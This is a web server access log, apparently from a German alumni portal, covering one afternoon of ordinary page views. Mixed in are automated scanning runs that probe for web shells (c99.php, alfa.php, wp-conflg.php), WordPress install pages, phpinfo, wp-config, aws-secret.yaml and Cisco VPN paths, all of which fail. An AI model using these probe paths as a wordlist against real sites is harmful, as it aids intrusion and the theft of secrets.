user;timestamp;referer;target;method;status
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:11;;/wp-blog.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:12;;/dropdown.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:12;;/wp-admin/js/index.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:12;;/foo.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:12;;/alfa.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:13;;/function/function.php?p=;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:13;;/v.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:13;;/wp-content/radio.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:14;;/ge.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:14;;/map.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:14;;/wp-admin/maint/admin.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:15;;/000.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:15;;/images/photo.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:15;;/images/c99.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:15;;/css/colors/coffee/index.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:16;;/uploads/form3.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:16;;/terminal.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:16;;/1.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:17;;/checker.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:17;;/wp-includes/compats.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:17;;/kk.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:18;;/img/5/radio.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:18;;/system_log.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:18;;/0x.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:19;;/wp-includes/css/dist/preferences/wp-login.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:19;;/wp-admin/network/wp-conflg.php?p=;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:19;;/hi.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:19;;/wp-trackback.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:20;;/htaccess.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:20;;/inputs.php?p=;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:20;;/images/sendme.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:21;;/wp-content/themes/jaida/lang.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:21;;/wp-admin/css/wp-conflg.php?p=;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:21;;/wp-includes/system_log.php?;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:22;;/wp-admin/images/wp-conflg.php?p=;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:24;;/pp.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:25;;/wp-content/themes/twentytwentytwo/index.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:25;;/css/colors/blue/index.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:25;;/article.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:26;;/moon.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:26;;/ff.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:26;;/if.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:27;;/av.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:27;;/wp-includes/ID3/about.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:27;;/wp-includes/rest-api/fields/index.php?;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:28;;/wp-includes/SimplePie/Canonical.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:28;;/wp-admin/js/wp-conflg.php?p=;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:28;;/ini.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:29;;/geck.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:29;;/wp-includes//about.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:29;;/a2.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:30;;/moon.php?p=;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:30;;/wp-admin/404.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:30;;/radio.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:31;;/info.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:31;;/avaa.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:31;;/yanz.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:32;;/simple.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:32;;/wp-admin/images/index.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:32;;/file.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:32;;/bypass.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:33;;/wp-includes/rk2.php;GET;404
b055739b9a85fef69dad64d0781ad75719018f470f2627c9c4875690b1890097;2025-11-04 11:36:33;;/wp-includes/js/js420.php;GET;404
50c18a9f435930cbdc37d64aaaa31b6029336e2d27b3feb52eda8a2d85748c02;2025-11-04 11:42:58;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
1e1d7277f2111744e5a63d1b440c34ade903441b36a79fd316bc67f54bbd4cfc;2025-11-04 11:43:05;/rechtliches/green-data;/rechtliches/green-data;GET;200
4993851ad3ca5768cbd2130537476df26894081d72896f19772ccc2f05d9cd32;2025-11-04 11:46:03;;/personen/alumni/schule/09A05;GET;200
65241c570a000e7740857c6f2cab8f3c6359f6d8d42eee7d2f728a84d54ea3c8;2025-11-04 11:50:23;;/;GET;200
50291f8e4984fef821837d448f35306e12bacc5ab29eaae78685455b2491545e;2025-11-04 11:52:20;;/;GET;200
d262b977a3a62b7a3fbe309626915ff388dde3e1551ed2963cc595feab5b5315;2025-11-04 11:55:23;;/personen/alumni/schule/5514;GET;200
a15fe33c252be75c0142fe22d9be5cb54c00fb97c396dd754d481716c70700c6;2025-11-04 12:03:51;;/personen/alumni/schule/4240016;GET;200
8bb3a7a3d56a54fd9a65ca8a1aac187fbe7d7c61086581d66a86835ec8528d4c;2025-11-04 12:04:36;;/developmentserver/metadatauploader;GET;404
fb7d1feb05b45954fd80bca69c059ff8177b01bea10652f44bcfadf70ec3003f;2025-11-04 12:12:09;;/personen/alumni/schule/5502;GET;200
cb5a59f0d82c47c26fb9750be96fe4fca34ddf55a510f2f9849b3a7297dbbe19;2025-11-04 12:14:08;;/docs/img/uml-relations.png;GET;404
98cebaaaa1b9dd4c96fe99e46ed6905efda3e997fd755dd365786f0cc6e8fbfa;2025-11-04 12:19:48;;/personen/alumni/schule/0351;GET;200
b5197f20e793da0c1169bd5586720c37d2107dedbec9a22154a38a85d3a49d95;2025-11-04 12:25:37;;/;GET;200
2575123efb97aa7917e63c874b8c1dc4682bf3bc4374c69155a8b5798b4102b9;2025-11-04 12:27:19;;/personen/alumni/schule/59026;GET;200
dc0de6d512764aa1e12df06d0288c7a6d512905633566cb26782d740c3db283b;2025-11-04 12:34:13;;/;GET;200
45f6e015bf37c2420a07c6057d622021c9dcdc063e55e2c65f6ea8f4e86c4394;2025-11-04 12:34:45;;/personen/alumni/schule/4340014;GET;200
2f31db41012a613aeeb9257eee4eeaa90ac19998f1a7c882b2dd115250af3ea3;2025-11-04 12:39:41;;/index.html;GET;404
58bfe8d1dba28119dd0e76ef702fb587690b190c388d5b37e3908ef90c17c4f2;2025-11-04 12:41:55;;/personen/alumni/schule/59000;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-04 12:46:56;;/personen/alumni/schule/164045;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-04 12:48:01;/gruppen/hobby/mathematik-wettbewerbe;/personen/alumni/details/albert-hammig;GET;200
3ddd422c08eb2e50d5649dc5626afb0aee66e5a228b26d80e356a09adf55bd16;2025-11-04 12:48:56;;/personen/alumni/schule/65262;GET;200
afc45b3c9ae544346539a204f5c3f58b451be58760448f2843f4fa2048c8e8ab;2025-11-04 12:53:40;;/;GET;200
6e7adb891466f166d703df09f51756a6d76cbd700d612f2fa80c20476562e673;2025-11-04 12:55:45;;/personen/alumni/schule/5505;GET;200
5e1bb3b150d895a1263d17728a9aa1ed56f3ab5568cd2fe97bf546ae84d11888;2025-11-04 12:58:05;;/;GET;200
8c714fd7b5e05ecb299bac139ce978269344b6ec484ea0cb33f58a29d958df72;2025-11-04 13:02:58;;/personen/alumni/schule/170720;GET;200
37238e9238e1dc325ccbeed37d93a19237c10bd7bc9b905ee39a13bdc6d6601f;2025-11-04 13:10:03;;/personen/alumni/schule/4240404;GET;200
9141c27bfb4017faeeee3efcc2618d98bc3cdb57ebe50019806a4f61670fed07;2025-11-04 13:13:52;;/personen;GET;200
334c4c1a10ab0811cc92acdafc78cacec8f3e3674e53d2b07c481d42273f0082;2025-11-04 13:17:32;;/veranstaltungen;GET;200
4702cb4e588b32daef3f16b62facdb8520f3f611553c477bd54f648696a0dd61;2025-11-04 13:17:42;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
7dd70f4798102f8dc7c4f57392eacb12fc8970c801753e8f37c7bc83f82bba6c;2025-11-04 13:24:25;;/personen/alumni/schule/59013;GET;200
531144f2c5ff450c19d4277e8e85cb0bf8dfc7a549d7e508b6c0c8744dfc8a17;2025-11-04 13:31:07;;/personen/alumni/schule/190627;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-04 13:36:29;/register;/personen/alumni/schule/5826;GET;200
a6ae396165c11d3b4b340574cd1f0316e959d958a15f298f98177fd06b428d0f;2025-11-04 13:39:19;;/personen/alumni/schule/191073;GET;200
9ff64ac6be6c3c5385829e6f5735a34e822915b4cb093f6a7fe562ca55c01b78;2025-11-04 13:53:47;;/aktuelles/meldungen?category=wissenschaft;GET;200
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:36;;/;GET;200
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:37;;//wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:40;;//xmlrpc.php?rsd;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:41;;/;GET;200
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:43;;//blog/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:45;;//web/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:46;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:48;;//website/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:50;;//wp/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:52;;//news/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:55;;//2020/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:56:58;;//2019/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:57:01;;//shop/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:57:04;;//wp1/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:57:06;;//test/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:57:09;;//wp2/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:57:12;;//site/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:57:14;;//cms/wp-includes/wlwmanifest.xml;GET;404
aac9052b29ce779df538cc27b461293c86eef5706421ea15627c2937f86820b0;2025-11-04 13:57:16;;//sito/wp-includes/wlwmanifest.xml;GET;404
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-04 14:01:56;;/themen/details/hackerangriff-lauft-ins-leere;GET;200
8423a601cc0cc50220477d753a0c2305c97f38a5e0c9fcf128f87cef21a808d6;2025-11-04 14:03:20;;/personen/alumni/schule/09A05;GET;200
c29935f58da8d4a22c80ad3f883fee76fcf429796c0144ba28a5bcd49da25948;2025-11-04 14:11:07;;/personen/alumni/schule/170574;GET;200
7fe6a025f578b8b395f27f915a5c575bb9dd757d175f33c6fa123ee3e1a0cd80;2025-11-04 14:18:05;;/.well-known/assetlinks.json;GET;404
4b0e9389fcfd0c600af4e0694046c102206128284ab51147054b6eee02185081;2025-11-04 14:18:05;;/.well-known/assetlinks.json;GET;404
b60c6c8cd9e3f470dd896f976b26270d3804cb8954e5437501d2373e5aa6fc8f;2025-11-04 14:18:22;;/personen/alumni/schule/0348;GET;200
14ddb6ae05229c8fd3b2611cc22eb9ff633954b4051a950493578bf9d56596bc;2025-11-04 14:23:01;/gruppen/hobby/kulturelle-studien;/gruppen/hobby/kulturelle-studien;GET;200
f7e0c3a398c793c1b82ac4fbbf0d037b5599e2ba9ef074c975dca8ef33253677;2025-11-04 14:25:24;;/personen/alumni/schule/5503;GET;200
fbd921068faf6d0fc6f2055c5639350cc61bb5b0f48783f632fefd82dc18c743;2025-11-04 14:32:33;;/personen/alumni/schule/5508;GET;200
b7cd0ad9e5e498ff093efa93b3ca595434c2b3f419c66a89199a807cb4dbf81d;2025-11-04 14:38:44;;/gruppen/hobby/mathematik-wettbewerbe;GET;200
20cf9e2c4f483b66b2b72f7e2864c8fb1117db4717db9a363ee812be8dc0d108;2025-11-04 14:39:30;;/personen/alumni/schule/5511;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-04 14:39:44;;/?XDEBUG_SESSION_START=phpstorm;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-04 14:42:31;/register;/personen/alumni/schule/610021;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-04 14:43:55;/gruppen/hobby/lesen;/personen/alumni/details/jessica-schwarz;GET;200
d42a13ed1f462560d388205c0f0d27782db7a980784e9223f45abf604c3c1752;2025-11-04 14:46:52;;/personen/alumni/schule/4440541;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:24;;/;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:25;;/;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:26;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:26;;/aktuelles/stellenangebote;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:26;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:26;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:26;;/themen/details/der-start-ins-studium;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:26;;/themen/details/abschied-aus-moabit;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:26;;/personen;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:26;;/phpinfo;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:27;;/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:29;;/_phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:29;;/_profiler/phpinfo;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:29;;/_profiler/phpinfo/info.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:29;;/_profiler/phpinfo/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:29;;/wp-config;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-04 14:48:38;;/aws-secret.yaml;GET;404
bddaf38dcfee1f49ec2db3bb44c3c75be87bef16a9ac38856effe621ec1a5c11;2025-11-04 14:53:50;;/personen/alumni/schule/170690;GET;200
835a958e4feea51074984a4c4bb8396caf750d308359da30fca8215b80cb7db2;2025-11-04 14:57:03;;/;GET;200
70bb5f34fcb5e4c8341cd59a2dce1029637b433953a3e289b61e8e7f1c99ab70;2025-11-04 15:01:05;;/personen/alumni/schule/5501;GET;200
fd4f83800bc910a053eebcf4966c47261b22ec225a3eb7e4d227b3c8d1690898;2025-11-04 15:05:11;;/personen/alumni/details/luca-onorini;GET;200
0419a51f78b35d19052a06cb2143b386f3f9caa333c880577cfa1e5e29331451;2025-11-04 15:08:19;;/personen/alumni/schule/5506;GET;200
6c339520a1aba428a6c5de612428f9919ae0ff1958bbb3174c0befbd65314a27;2025-11-04 15:12:11;;/;GET;200
fbd3c23d942c3044de11459a40b8b366b8f520c9ed43c5d4bfd8a2df47755cab;2025-11-04 15:15:38;;/personen/alumni/schule/5514;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-04 15:16:56;;/gruppen/hobby/social-media-management;GET;200
0d88c8980dff4ac6a7d364ee9ce537f7b4000980b17cee481af4877b4356ffbe;2025-11-04 15:22:56;;/personen/alumni/schule/4240016;GET;200
9fd9c917894aa5d24fafde96795cf317d887d1bb1a337095da648325f5c71503;2025-11-04 15:30:03;;/personen/alumni/schule/5502;GET;200
cb72eb0418ace7654c405e92adb4499de145cca21b9ee066584a01bf159be363;2025-11-04 15:35:12;;/;GET;200
47f1ec1f59236fc573362c1d75fa8081e5d347f1c537dd0f7c97dfb397413fb1;2025-11-04 15:37:33;;/personen/alumni/schule/0351;GET;200
0c3df7569b3ad87cb6e1929cf0c8479a16b21f820baffb4f2ff33ec4b33837ae;2025-11-04 15:40:25;;/+CSCOL+/Java.jar;GET;404
0c3df7569b3ad87cb6e1929cf0c8479a16b21f820baffb4f2ff33ec4b33837ae;2025-11-04 15:40:26;;/+CSCOE+/logon_forms.js;GET;404
0c3df7569b3ad87cb6e1929cf0c8479a16b21f820baffb4f2ff33ec4b33837ae;2025-11-04 15:40:28;;/+CSCOL+/a1.jar;GET;404
0c3df7569b3ad87cb6e1929cf0c8479a16b21f820baffb4f2ff33ec4b33837ae;2025-11-04 15:40:29;;/+CSCOE+/transfer.js;GET;404
a14bc5cdeb1d0cf62840062b8dcccc98101a1be52207dfef5dd4d69a187291fb;2025-11-04 15:42:42;;/;GET;200
9f0370abd905eb6086fac5f88d4d3425690ffaaf1c38341818bda8bd0be260df;2025-11-04 15:44:34;;/;GET;200
d985c20c25ee0bb134920bc2cbd21aa6aa0187d0d3024d6bf9290395acad7769;2025-11-04 15:49:07;;/aktuelles/meldungen?category=wissenschaft;GET;200
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:11;;/;GET;200
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:37;;/wp-admin/install.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:40;;/wordpress/wp-admin/setup-config.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:40;;/wordpress/wp-admin/install.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:40;;/wp/wp-admin/setup-config.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:41;;/wp/wp-admin/install.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:41;;/new/wp-admin/setup-config.php?step=1&language=en_GB;GET;404
5149eb8b3daba21c7836bc5c6cafb65661c262e2e43cc61cf40b5f1c17600bb5;2025-11-04 15:50:41;;/new/wp-admin/install.php?step=1&language=en_GB;GET;404
